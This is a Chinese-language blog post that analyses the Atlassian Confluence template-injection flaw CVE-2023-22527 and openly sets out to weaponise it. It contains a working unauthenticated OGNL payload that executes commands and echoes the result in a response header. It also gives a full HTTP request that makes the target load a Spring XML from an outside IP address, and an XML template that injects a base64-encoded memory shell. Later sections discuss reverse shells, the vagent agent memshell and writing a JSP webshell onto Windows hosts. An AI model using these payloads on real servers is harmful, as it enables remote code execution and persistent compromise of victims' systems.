<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Atlassian Confluence CVE-2023-22527 分析及武器化实现 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Atlassian Confluence CVE-2023-22527 分析及武器化实现 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/02/29/Atlassian%20Confluence%20CVE-2023-22527%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%AD%A6%E5%99%A8%E5%8C%96%E5%AE%9E%E7%8E%B0/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-29T00:41:58.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>29,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">Atlassian Confluence CVE-2023-22527 分析及武器化实现</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="0-0-参考文献"><a href="#0-0-参考文献" class="headerlink" title="0-0 参考文献"></a>0-0 参考文献</h1><p>文章在先知社区首发</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13351?time__1311=mqmxnDBG0QIxcDBqDTeeqBIoK7uktlliiGoD&alichlgref=https://www.google.com/">Atlassian Confluence 模板注入代码执行漏洞（CVE-2023-22527） - 先知社区</a><br><a target="_blank" rel="noopener" href="https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context">Bypassing OGNL sandboxes for fun and charities</a></p>
<h1 id="0-1-简要分析"><a href="#0-1-简要分析" class="headerlink" title="0-1 简要分析"></a>0-1 简要分析</h1><p>漏洞点源自于<code>/template/aui/text-inline.vm</code>路由的一个未授权访问，这是一个velocity模板文件，该模板文件内容如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#set( $labelValue = $stack.findValue(&quot;getText(&#x27;$parameters.label&#x27;)&quot;) )</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>( !$labelValue )</span></span><br><span class="line">    <span class="meta">#set( $labelValue = $parameters.label )</span></span><br><span class="line"><span class="meta">#end</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (!$parameters.id)</span></span><br><span class="line">    <span class="meta">#set( $parameters.id = $parameters.name)</span></span><br><span class="line"><span class="meta">#end</span></span><br><span class="line"></span><br><span class="line">&lt;label id=<span class="string">&quot;$&#123;parameters.id&#125;-label&quot;</span> <span class="keyword">for</span>=<span class="string">&quot;$parameters.id&quot;</span>&gt;</span><br><span class="line">$!labelValue</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>($parameters.required)</span></span><br><span class="line">    &lt;span <span class="keyword">class</span>=<span class="string">&quot;aui-icon icon-required&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">    &lt;span <span class="keyword">class</span>=<span class="string">&quot;content&quot;</span>&gt;$parameters.required&lt;/span&gt;</span><br><span class="line"><span class="meta">#end</span></span><br><span class="line">&lt;/label&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#parse(&quot;/template/aui/text-include.vm&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>漏洞点自然就在<code>$stack.findValue(&quot;getText(&#39;$parameters.label&#39;)</code>明显的一段OgnlStack的findValue操作，那么label参数就会被ognl解析。因此payload第一段为</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa<span class="keyword">\u</span>0027<span class="comment">%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],&#123;&#125;)%2b\u0027</span></span><br></pre></td></tr></table></figure>
<p>用unicode是为了防止url编码导致参数传入失败。并且Ognl是支持unicode编码的。之后就是poc的第二段</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(&#x27;Cmd-Responses-Header&#x27;,(new freemarker.template.utility.Execute()).exec(&#123;&quot;id&quot;&#125;))</span><br></pre></td></tr></table></figure>
<p>用freemarker去做命令执行处理,cmd回显策略。这一段就是很普通的ognl命令回显了，并没有什么其他的操作。</p>
<h2 id="0-1-1-有趣的思考"><a href="#0-1-1-有趣的思考" class="headerlink" title="0-1.1 有趣的思考"></a>0-1.1 有趣的思考</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707673068920-0abd368c-aa6f-4b41-b807-82baf219f6d3.png#averageHue=%232f333a&clientId=u9363bb59-db00-4&from=paste&height=675&id=ubc494160&originHeight=844&originWidth=1881&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=277246&status=done&style=none&taskId=u1273c3bc-4331-44d8-bb33-1983b3a8ed9&title=&width=1504.8" alt="image.png"><br>漏洞点中的context如上图所示，内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&quot;com.opensymphony.xwork2.ActionContext.locale&quot; -&gt; &#123;Locale@66441&#125; </span><br><span class="line">&quot;request&quot; -&gt; &#123;RequestMap@66442&#125;  size = 32</span><br><span class="line"> key = &quot;request&quot;</span><br><span class="line"> value = &#123;RequestMap@66442&#125;  size = 32</span><br><span class="line">  &quot;__prepare_recursion_counter&quot; -&gt; &#123;Integer@66509&#125; 1</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.RemoteHost&quot; -&gt; &quot;127.0.0.1&quot;</span><br><span class="line">  &quot;com.atlassian.confluence.util.message.MessagesDecoratorFilter__already_filtered__&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;Confluence-Request-Time&quot; -&gt; &#123;Long@66515&#125; 1707673048234</span><br><span class="line">  &quot;com.opensymphony.sitemesh.APPLIED_ONCE&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.tomcat.remoteAddr&quot; -&gt; &quot;127.0.0.1&quot;</span><br><span class="line">  &quot;B3-TraceId&quot; -&gt; &quot;a981718bad3947&quot;</span><br><span class="line">  &quot;struts.actionMapping&quot; -&gt; &quot;noActionMapping&quot;</span><br><span class="line">  &quot;__wrap_recursion_counter&quot; -&gt; &#123;Integer@66509&#125; 1</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.Protocol&quot; -&gt; &quot;HTTP/1.1&quot;</span><br><span class="line">  &quot;.KEY_velocity.struts2.context&quot; -&gt; &#123;StrutsVelocityContext@66526&#125; </span><br><span class="line">  &quot;com.atlassian.confluence.web.ConfluenceJohnsonFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;brave.propagation.TraceContext&quot; -&gt; &#123;TraceContext@66529&#125; </span><br><span class="line">  &quot;com.atlassian.gzipfilter.GzipFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.ServerName&quot; -&gt; &quot;localhost&quot;</span><br><span class="line">  &quot;atlassian.core.seraph.original.url&quot; -&gt; &quot;/template/aui/text-inline.vm&quot;</span><br><span class="line">  &quot;com.atlassian.labs.botkiller.BotKillerFilter&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;sessioninview.FILTERED&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.struts2.dispatcher.filter.StrutsPrepareFilter.REQUEST_EXCLUDED_FROM_ACTION_MAPPING&quot; -&gt; &#123;Boolean@66538&#125; false</span><br><span class="line">  &quot;com.atlassian.confluence.web.filter.validateparam.RequestParamValidationFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;brave.servlet.TracingFilter$SendHandled&quot; -&gt; &#123;TracingFilter$SendHandled@66541&#125; </span><br><span class="line">  &quot;brave.SpanCustomizer&quot; -&gt; &#123;SpanCustomizerShield@66543&#125; </span><br><span class="line">  &quot;sitemesh.secondaryStorageLimit&quot; -&gt; &#123;Long@66545&#125; -1</span><br><span class="line">  &quot;org.apache.tomcat.request.forwarded&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.prettyurls.filter.PrettyUrlsSiteMeshFilter&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.ServerPort&quot; -&gt; &#123;Integer@66549&#125; 8090</span><br><span class="line">  &quot;os_securityfilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.core.filters.HeaderSanitisingFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.prettyurls.filter.PrettyUrlsSiteMeshFixupFilter&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;loginfilter.already.filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.confluence.impl.profiling.DecoratorTimings&quot; -&gt; &#123;DecoratorTimings@66555&#125; </span><br><span class="line">  &quot;org.apache.catalina.AccessLog.RemoteAddr&quot; -&gt; &quot;127.0.0.1&quot;</span><br><span class="line">&quot;session&quot; -&gt; &#123;SessionMap@66443&#125;  size = 1</span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.PageContext&quot; -&gt; &#123;PageContextImpl@66445&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot; -&gt; &#123;OgnlValueStack@60828&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.container&quot; -&gt; &#123;ContainerImpl@66448&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot; -&gt; &#123;StrutsRequestWrapper@60863&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot; -&gt; &#123;OAuthFilter$OAuthWWWAuthenticateAddingResponse@66451&#125; </span><br><span class="line">&quot;last.property.accessed&quot; -&gt; null</span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.parameters&quot; -&gt; &#123;HttpParameters@66454&#125;  size = 2</span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.ServletContext&quot; -&gt; &#123;StandardContext$NoPluggabilityServletContext@66456&#125; </span><br><span class="line">&quot;last.bean.accessed&quot; -&gt; null</span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.application&quot; -&gt; &#123;ApplicationMap@66459&#125;  size = 21</span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.session&quot; -&gt; &#123;SessionMap@66443&#125;  size = 1</span><br><span class="line">&quot;application&quot; -&gt; &#123;ApplicationMap@66459&#125;  size = 21</span><br><span class="line">&quot;attr&quot; -&gt; &#123;AttributeMap@66463&#125; Unable to evaluate the expression Method threw &#x27;java.lang.UnsupportedOperationException&#x27; exception.</span><br><span class="line">&quot;current.property.path&quot; -&gt; null</span><br><span class="line">&quot;parameters&quot; -&gt; &#123;HttpParameters@66454&#125;  size = 2</span><br></pre></td></tr></table></figure>
<p>其中<code>.KEY_velocity.struts2.context</code>对应获取context上下文，那么这些其他的属性呢？我们也是可以获取的，是否有其他利用点呢？我相信答案肯定是有的，这里笔者就不偏离主题了，只阐述一下一种可能的思路。今天的重点是武器化</p>
<h1 id="0-2-武器化实现"><a href="#0-2-武器化实现" class="headerlink" title="0-2 武器化实现"></a>0-2 武器化实现</h1><h2 id="0-2-1-出网"><a href="#0-2-1-出网" class="headerlink" title="0-2.1 出网"></a>0-2.1 出网</h2><h3 id="0-2-1-1-ClassPathXmlApplicationContext"><a href="#0-2-1-1-ClassPathXmlApplicationContext" class="headerlink" title="0-2.1.1 ClassPathXmlApplicationContext"></a>0-2.1.1 ClassPathXmlApplicationContext</h3><p>出网的话解决方法也好说，Poc如下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8090</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>193</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">label=aaa\u0027%<span class="number">2</span>b#request.get(\u0027.<span class="module-access"><span class="module"><span class="identifier">KEY_velocity</span>.</span></span>struts2.context\u0027).internal<span class="constructor">Get(\<span class="params">u0027ognl</span>\<span class="params">u0027</span>)</span>.find<span class="constructor">Value(#<span class="params">parameters</span>.<span class="params">poc</span>[0],&#123;&#125;)</span>%<span class="number">2</span>b\u0027&amp;poc=#a=<span class="keyword">new</span> org.springframework.context.support.<span class="constructor">ClassPathXmlApplicationContext(&#x27;<span class="params">http</span>:<span class="operator">/</span><span class="operator">/</span>8.130.24.188:8888<span class="operator">/</span>1.<span class="params">xml</span>&#x27;)</span></span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707673463300-18c9eb7c-997c-4a23-a7af-81097a492859.png#averageHue=%23ab9e82&clientId=u9363bb59-db00-4&from=paste&height=739&id=u1d136b87&originHeight=924&originWidth=1606&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98374&status=done&style=none&taskId=u4e67c26d-2a49-49ba-ad14-03dc9bd857e&title=&width=1284.8" alt="image.png"><br>这个Poc首先是成立的，然后假如想进一步利用就利用SPEL去注入内存马即可了。<br>exp的模板如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:spring</span>=<span class="string">&quot;http://camel.apache.org/schema/spring&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans </span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans/spring-beans.xsd </span></span></span><br><span class="line"><span class="string"><span class="tag">http://camel.apache.org/schema/spring </span></span></span><br><span class="line"><span class="string"><span class="tag">http://camel.apache.org/schema/spring/camel-spring.xsd </span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">ignore-resource-not-found</span>=<span class="string">&quot;false&quot;</span> <span class="attr">ignore</span></span></span><br><span class="line"><span class="tag"><span class="attr">unresolvable</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;ClassBase64Str&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> </span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">&quot;&lt;base64&gt;&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;#</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;&lt;classname&gt;&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(ClassBase64Str.to</span></span></span><br><span class="line"><span class="string"><span class="tag"> String()),new javax.management.loading.MLet(new </span></span></span><br><span class="line"><span class="string"><span class="tag">java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())</span></span></span><br><span class="line"><span class="string"><span class="tag"> ).newInstance().test1()&#125;&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样的话我们也可以达到一种武器化。但是既然都出网了，我们为什么不反弹shell然后做后渗透呢？你说得对，这一是一种方法</p>
<h3 id="0-2-1-2-Agent-Memshell-ReverseShell"><a href="#0-2-1-2-Agent-Memshell-ReverseShell" class="headerlink" title="0.2.1.2 Agent Memshell+ReverseShell"></a>0.2.1.2 Agent Memshell+ReverseShell</h3><p>假如我们通过反弹shell获得了一个confluence权限，那么我们可以注入内存马吗？答案是肯定的，但是既然都拿到了反弹shell，我们当然也是可以直接上C2平台后渗透的，但是有时候有一些特殊的需求，我们是必须需要内存马的。<br>这时候可以使用vagent进行后渗透处理。<br><a target="_blank" rel="noopener" href="https://github.com/veo/vagent">https://github.com/veo/vagent</a><br>使用效果如下，我们可以直接进行哥斯拉连接<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707673702294-0f55615c-64f0-42f7-8136-ef7131a458ff.png#averageHue=%233f414a&clientId=u9363bb59-db00-4&from=paste&height=638&id=ub0eba9b6&originHeight=797&originWidth=1488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=559078&status=done&style=none&taskId=u4fcfd5a7-b1b7-4dfb-93ee-b73faef7fae&title=&width=1190.4" alt="image.png"><br>至于agent内存马的原理就可以自行去了解，阅读一下vagent的源码会很有帮助~</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">targetClasses</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">targetClasses</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">targetClassJavaxMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        targetClassJavaxMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;service&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">paramJavaxClsStrList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        paramJavaxClsStrList.add(<span class="string">&quot;javax.servlet.ServletRequest&quot;</span>);</span><br><span class="line">        paramJavaxClsStrList.add(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>);</span><br><span class="line">        targetClassJavaxMap.put(<span class="string">&quot;paramList&quot;</span>, paramJavaxClsStrList);</span><br><span class="line">        targetClasses.put(<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>, targetClassJavaxMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">targetClassJakartaMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        targetClassJakartaMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;service&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">paramJakartaClsStrList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        paramJakartaClsStrList.add(<span class="string">&quot;jakarta.servlet.ServletRequest&quot;</span>);</span><br><span class="line">        paramJakartaClsStrList.add(<span class="string">&quot;jakarta.servlet.ServletResponse&quot;</span>);</span><br><span class="line">        targetClassJakartaMap.put(<span class="string">&quot;paramList&quot;</span>, paramJakartaClsStrList);</span><br><span class="line">        targetClasses.put(<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>, targetClassJavaxMap);</span><br><span class="line">        targetClasses.put(<span class="string">&quot;jakarta.servlet.http.HttpServlet&quot;</span>, targetClassJakartaMap);</span><br><span class="line">        <span class="keyword">if</span> (ServerDetector.isWebLogic()) &#123;</span><br><span class="line">            targetClasses.clear();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">targetClassWeblogicMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            targetClassWeblogicMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">            <span class="type">List</span> <span class="variable">paramWeblogicClsStrList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">            paramWeblogicClsStrList.add(<span class="string">&quot;javax.servlet.ServletRequest&quot;</span>);</span><br><span class="line">            paramWeblogicClsStrList.add(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>);</span><br><span class="line">            targetClassWeblogicMap.put(<span class="string">&quot;paramList&quot;</span>, paramWeblogicClsStrList);</span><br><span class="line">            targetClasses.put(<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span>, targetClassWeblogicMap);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> targetClasses;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>定义了很多targetclass，然后利用插秧技术直接插入了一段shellcode。非常不错的思路</p>
<h3 id="0-2-1-3-Windows系统？"><a href="#0-2-1-3-Windows系统？" class="headerlink" title="0.2.1.3 Windows系统？"></a>0.2.1.3 Windows系统？</h3><p>万一是windows系统呢？当然这种可能性很小，confluence一般都是部署在linux服务器上的。那假如是windows服务器，不能反弹shell，我们该怎么做？这里提供一种可能的思路，既然是tomcat部署的，我们直接笨一点，一段段的echo一个jsp木马进去就好了。</p>
